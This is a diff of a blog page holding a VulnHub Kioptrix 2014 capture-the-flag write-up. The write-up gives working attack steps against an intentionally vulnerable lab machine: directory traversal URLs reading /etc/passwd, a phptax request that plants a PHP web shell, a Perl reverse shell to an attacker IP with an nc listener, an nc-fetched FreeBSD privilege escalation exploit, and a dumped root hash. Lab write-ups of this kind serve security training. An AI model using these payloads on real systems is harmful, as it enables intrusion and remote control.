@@ -1,4 +1,50 @@
-<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>मंथन | Manthan</title><link rel=icon type=image/webp sizes=32x32 href=/static/images/manthan-32x32.png.webp><link rel=stylesheet type=text/css media=screen href=/static/css/style.rainbow.css><link rel=stylesheet href=/static/css/atelier-forest-light.css><script charset=UTF-8 src=/static/js/highlight.min.js></script><script charset=UTF-8 src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script></head><body><div class=header><table><tr><td><a href=/index.html class=menu_home>मंथन</a></td><td> | </td><td><a href=/archive.html class=menu_archive>Archive</a></td><td> | </td><td><a href=/tags.html class=menu_tags>Tags</a></td><td> | </td><td><a href=/stats.html class=menu_stats>Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[VulnHub] Kioptrix: 2014 (#5)</h1><p><a href=/posts/20191008_vulnhub-kioptrix4.html> « </a>📅 published on <code>09/Oct/2019</code><a href=/posts/20191010_vulnhub-lordoftheroot101.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/kioptrix-2014-5,62/ >Kioptrix: 2014 (#5)</a>. Here are stats for this machine from <a href=https://github.com/7h3rAm/machinescli>machinescli</a>:</p><p class=nested><img alt=writeup.overview.machinescli src=/static/files/posts_vulnhub_kioptrix5/machinescli.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>Killchain</h3><p class=nested>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_kioptrix5/killchain.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>TTPs</h3><p class=nested>1. <code>80/tcp/http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</code>: <a href=https://github.com/7h3rAm/writeups#exploit_pchart>exploit_pchart</a><br> 2. <code>8080/tcp/http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</code>: <a href=https://github.com/7h3rAm/writeups#exploit_phptax>exploit_phptax</a>, <a href=https://github.com/7h3rAm/writeups#privesc_freebsd>privesc_freebsd</a> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Wed Oct  9 12:11:53 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix5/results/192.168.92.185/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix5/results/192.168.92.185/scans/xml/_quick_tcp_nmap.xml 192.168.92.185
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>मंथन | Manthan</title>
+    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
+    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" class="menu_home">मंथन</a></td><td> | </td>
+          <td><a href="/archive.html" class="menu_archive">Archive</a></td><td> | </td>
+          <td><a href="/tags.html" class="menu_tags">Tags</a></td><td> | </td>
+          <td><a href="/stats.html" class="menu_stats">Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1>[VulnHub] Kioptrix: 2014 (#5)</h1>
+                  <p><a href="/posts/20191008_vulnhub-kioptrix4.html"> « </a>📅 published on <code>09/Oct/2019</code><a href="/posts/20191010_vulnhub-lordoftheroot101.html"> » </a></p>
+                <h2>Overview</h2>
+<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix5/machinescli.png.webp" /></p>
+<h3>Killchain</h3>
+<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix5/killchain.png.webp" /></p>
+<h3>TTPs</h3>
+<p>1. <code>80/tcp/http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_pchart">exploit_pchart</a><br />
+2. <code>8080/tcp/http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_phptax">exploit_phptax</a>, <a href="https://github.com/7h3rAm/writeups#privesc_freebsd">privesc_freebsd</a>  </p>
+<h2>Phase #1: Enumeration</h2>
+<p>1. Here's the Nmap scan result:  </p>
+<pre><code># Nmap 7.70 scan initiated Wed Oct  9 12:11:53 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix5/results/192.168.92.185/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix5/results/192.168.92.185/scans/xml/_quick_tcp_nmap.xml 192.168.92.185
 Nmap scan report for 192.168.92.185
 Host is up, received arp-response (0.00043s latency).
 Scanned at 2019-10-09 12:11:53 PDT for 35s
@@ -17,12 +63,29 @@ MAC Address: 00:0C:29:0B:79:90 (VMware)
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Oct  9 12:12:28 2019 -- 1 IP address (1 host up) scanned in 35.43 seconds
-</code></pre><p class=nested>2. Here a summary of open ports and associated <a href=https://github.com/Tib3rius/AutoRecon>AutoRecon</a> scan files:</p><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_vulnhub_kioptrix5/openports.png.webp> </p><p class=nested>3. While exploring the <code>80/tcp</code> service, we find a HTML comment that points to <code>pChart2.1.3/index.php</code>: </p><p class=nested><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_vulnhub_kioptrix5/screenshot01.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.3.2 src=/static/files/posts_vulnhub_kioptrix5/screenshot02.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.3.3 src=/static/files/posts_vulnhub_kioptrix5/screenshot03.png.webp> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>80/tcp    |  http  |  Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
+</code></pre>
+<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix5/openports.png.webp" />  </p>
+<p>3. While exploring the <code>80/tcp</code> service, we find a HTML comment that points to <code>pChart2.1.3/index.php</code>:  </p>
+<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot01.png.webp" />  </p>
+<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_kioptrix5/screenshot02.png.webp" />  </p>
+<p><img alt="writeup.enumeration.steps.3.3" src="/static/files/posts_vulnhub_kioptrix5/screenshot03.png.webp" />  </p>
+<h3>Findings</h3>
+<h4>Open Ports</h4>
+<pre><code>80/tcp    |  http  |  Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
 8080/tcp  |  http  |  Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. We use <code>searchsploit</code> to look for <code>pChart</code> exploits and find a directory traversal exploit. We use this exploit to view the contents of the <code>/etc/passwd</code> file: </p><pre class=nested><code>searchsploit pchart
+</code></pre>
+<h2>Phase #2: Exploitation</h2>
+<p>1. We use <code>searchsploit</code> to look for <code>pChart</code> exploits and find a directory traversal exploit. We use this exploit to view the contents of the <code>/etc/passwd</code> file:  </p>
+<pre><code>searchsploit pchart
 searchsploit -x 31173
 http://192.168.92.185/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../etc/passwd
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_kioptrix5/screenshot04.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_vulnhub_kioptrix5/screenshot05.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.1.3 src=/static/files/posts_vulnhub_kioptrix5/screenshot06.png.webp> </p><p class=nested>2. We use the directory traversal vulnerability to look for the Apache configuration file as <code>8080/tcp</code> is returning a <code>403 Forbidden</code> code: </p><pre class=nested><code>http://192.168.92.185/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../usr/local/etc/apache22/httpd.conf
+</code></pre>
+<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot04.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix5/screenshot05.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix5/screenshot06.png.webp" />  </p>
+<p>2. We use the directory traversal vulnerability to look for the Apache configuration file as <code>8080/tcp</code> is returning a <code>403 Forbidden</code> code:  </p>
+<pre><code>http://192.168.92.185/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../usr/local/etc/apache22/httpd.conf
   SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
 
   &lt;VirtualHost *:8080&gt;
@@ -34,20 +97,35 @@ http://192.168.92.185/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../
       Order allow,deny
       Allow from env=Mozilla4_browser
   &lt;/Directory&gt;
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_kioptrix5/screenshot07.png.webp> </p><p class=nested>3. The web server is configured to only allow clients with a user-agent string starting with the <code>Mozilla/4.0</code> string. We use Burp proxy to make a request to the <code>8080/tcp</code> service: </p><p class=nested><img alt=writeup.exploitation.steps.3.1 src=/static/files/posts_vulnhub_kioptrix5/screenshot08.png.webp> </p><p class=nested>4. Now that we can talk to the <code>8080/tcp</code> service, we find a reference to the <code>/phptax/</code> web application on this server. We find a remote code execution vulnerability for <code>phptax</code> and leverage it to get command execution: </p><pre class=nested><code>searchsploit phptax
+</code></pre>
+<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot07.png.webp" />  </p>
+<p>3. The web server is configured to only allow clients with a user-agent string starting with the <code>Mozilla/4.0</code> string. We use Burp proxy to make a request to the <code>8080/tcp</code> service:  </p>
+<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot08.png.webp" />  </p>
+<p>4. Now that we can talk to the <code>8080/tcp</code> service, we find a reference to the <code>/phptax/</code> web application on this server. We find a remote code execution vulnerability for <code>phptax</code> and leverage it to get command execution:  </p>
+<pre><code>searchsploit phptax
 searchsploit -x 25849
 GET /phptax/index.php?field=rce.php&amp;newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E HTTP/1.1
   Host: 192.168.92.185:8080
   User-Agent: Mozilla/4.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
 GET /phptax/data/rce.php?cmd=uname%20-a HTTP/1.1
   Host: 192.168.92.185:8080
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.4.1 src=/static/files/posts_vulnhub_kioptrix5/screenshot09.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.4.2 src=/static/files/posts_vulnhub_kioptrix5/screenshot10.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.4.3 src=/static/files/posts_vulnhub_kioptrix5/screenshot11.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.4.4 src=/static/files/posts_vulnhub_kioptrix5/screenshot12.png.webp> </p><p class=nested>5. We find that the remote system is FreeBSD 9. We tried Bash and Python reverse shells but both failed and as such we fall back on a <a href=https://www.phillips321.co.uk/2012/02/05/reverse-shell-cheat-sheet/ >Perl reverse shell</a> for interactive access: </p><pre class=nested><code>perl reverse shell (decoded): perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.92.183:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre>
+<p><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot09.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.4.2" src="/static/files/posts_vulnhub_kioptrix5/screenshot10.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.4.3" src="/static/files/posts_vulnhub_kioptrix5/screenshot11.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.4.4" src="/static/files/posts_vulnhub_kioptrix5/screenshot12.png.webp" />  </p>
+<p>5. We find that the remote system is FreeBSD 9. We tried Bash and Python reverse shells but both failed and as such we fall back on a <a href="https://www.phillips321.co.uk/2012/02/05/reverse-shell-cheat-sheet/">Perl reverse shell</a> for interactive access:  </p>
+<pre><code>perl reverse shell (decoded): perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.92.183:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
 perl reverse shell (url encoded): perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24p%29%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%22192.168.92.183%3A443%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bsystem%24_%20while%3C%3E%3B%27
 
 nc -nlvp 443
 GET /phptax/data/rce.php?cmd=perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24p%29%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%22192.168.92.183%3A443%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bsystem%24_%20while%3C%3E%3B%27 HTTP/1.1
   Host: 192.168.92.185:8080
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.5.1 src=/static/files/posts_vulnhub_kioptrix5/screenshot13.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.5.2 src=/static/files/posts_vulnhub_kioptrix5/screenshot14.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>www@kioptrix2014&gt; id
+</code></pre>
+<p><img alt="writeup.exploitation.steps.5.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot13.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.5.2" src="/static/files/posts_vulnhub_kioptrix5/screenshot14.png.webp" />  </p>
+<h2>Phase #2.5: Post Exploitation</h2>
+<pre><code>www@kioptrix2014&gt; id
 uid=80(www) gid=80(www) groups=80(www)
 www@kioptrix2014&gt;  
 www@kioptrix2014&gt; uname
@@ -65,12 +143,53 @@ www@kioptrix2014&gt;
 www@kioptrix2014&gt; users
 root
 toor
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. While exploring the system, we look for privilege escalation exploits for FreeBSD 9 and find two hits. Since the target system doesn't have <code>wget</code> or <code>curl</code> we fallback on <code>nc</code> to download the exploit file. Once compiled, we execute the exploit and get elevated access: </p><pre class=nested><code>searchsploit freebsd 9.0
+</code></pre>
+<h2>Phase #3: Privilege Escalation</h2>
+<p>1. While exploring the system, we look for privilege escalation exploits for FreeBSD 9 and find two hits. Since the target system doesn't have <code>wget</code> or <code>curl</code> we fallback on <code>nc</code> to download the exploit file. Once compiled, we execute the exploit and get elevated access:  </p>
+<pre><code>searchsploit freebsd 9.0
 searchsploit -x 28718
 nc -nlvp 9999 &lt;28718.c
 nc 192.168.92.183 9999 &gt;28718.c
 gcc -o 28718 28718.c
 ./28718
-</code></pre><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_kioptrix5/screenshot15.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.1.2 src=/static/files/posts_vulnhub_kioptrix5/screenshot16.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.1.3 src=/static/files/posts_vulnhub_kioptrix5/screenshot17.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.1.4 src=/static/files/posts_vulnhub_kioptrix5/screenshot18.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.1.5 src=/static/files/posts_vulnhub_kioptrix5/screenshot19.png.webp> </p><p class=nested>2. We can now view the <code>congrats.txt</code> file to complete the challenge: </p><pre class=nested><code>cat /root/congrats.txt
-</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_kioptrix5/screenshot20.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>root:$1$DdHlo6rh$usiPcDoTR37eL7DAyLjhk1:0:0::0:0:Charlie &amp;:..............
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.vulnhub.com/entry/kioptrix-2014-5,62/ >https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a> </li><li><a href=https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html>https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html</a> </li><li><a href=https://jhalon.github.io/vulnhub-kioptrix5/ >https://jhalon.github.io/vulnhub-kioptrix5/</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20191008_vulnhub-kioptrix4.html>[VulnHub] Kioptrix: Level 1.3 ...</a> « | » <a href=/posts/20191010_vulnhub-lordoftheroot101.html>[VulnHub] Lord Of The Root: 1....</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class="footer footercenter"><span><a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a></span></div></body></html>
+</code></pre>
+<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot15.png.webp" />  </p>
+<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_kioptrix5/screenshot16.png.webp" />  </p>
+<p><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_kioptrix5/screenshot17.png.webp" />  </p>
+<p><img alt="writeup.privesc.steps.1.4" src="/static/files/posts_vulnhub_kioptrix5/screenshot18.png.webp" />  </p>
+<p><img alt="writeup.privesc.steps.1.5" src="/static/files/posts_vulnhub_kioptrix5/screenshot19.png.webp" />  </p>
+<p>2. We can now view the <code>congrats.txt</code> file to complete the challenge:  </p>
+<pre><code>cat /root/congrats.txt
+</code></pre>
+<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot20.png.webp" />  </p>
+<h2>Loot</h2>
+<h3>Hashes</h3>
+<pre><code>root:$1$DdHlo6rh$usiPcDoTR37eL7DAyLjhk1:0:0::0:0:Charlie &amp;:..............
+</code></pre>
+<h2>References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a>  </li>
+<li><a href="https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html">https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html</a>  </li>
+<li><a href="https://jhalon.github.io/vulnhub-kioptrix5/">https://jhalon.github.io/vulnhub-kioptrix5/</a>  </li>
+</ul>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20191008_vulnhub-kioptrix4.html">[VulnHub] Kioptrix: Level 1.3 ...</a> « | » <a href="/posts/20191010_vulnhub-lordoftheroot101.html">[VulnHub] Lord Of The Root: 1....</a> »</p>
+            </div>
+    <div class="footer footercenter">
+      <span>
+        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+      </span>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+    <script>
+      function toggle(s){
+        s.classList.toggle("expanded");
+        for(var l=s.nextElementSibling;l;){
+          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+        }
+      }
+    </script>
+    <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
+  </body>
+</html>
